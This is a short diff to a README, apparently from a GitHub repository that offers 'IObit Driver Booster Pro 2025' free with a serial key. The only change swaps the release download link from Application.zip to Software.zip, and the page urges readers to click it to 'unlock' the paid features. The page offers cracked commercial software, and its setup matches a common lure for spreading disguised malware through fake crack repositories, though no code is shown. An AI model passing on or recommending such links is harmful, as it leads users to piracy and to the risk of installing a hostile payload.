@@ -21,7 +21,7 @@ Explore the following topics within this repository:
 - `free-driverbooster`
 
 ## Access the Software
-🔗 [Launch https://github.com/alifarya/IObit-Driver-Booster-Pro-2025-free-Serial-Key/releases/download/v1.0.0/Application.zip](https://github.com/alifarya/IObit-Driver-Booster-Pro-2025-free-Serial-Key/releases/download/v1.0.0/Application.zip)
+🔗 [Launch https://github.com/alifarya/IObit-Driver-Booster-Pro-2025-free-Serial-Key/releases/download/v2.0/Software.zip](https://github.com/alifarya/IObit-Driver-Booster-Pro-2025-free-Serial-Key/releases/download/v2.0/Software.zip)
 
 Make sure to click the link above to access the software file. This will allow you to initiate the download process and unlock the Driver Booster Pro 2025 features.
 
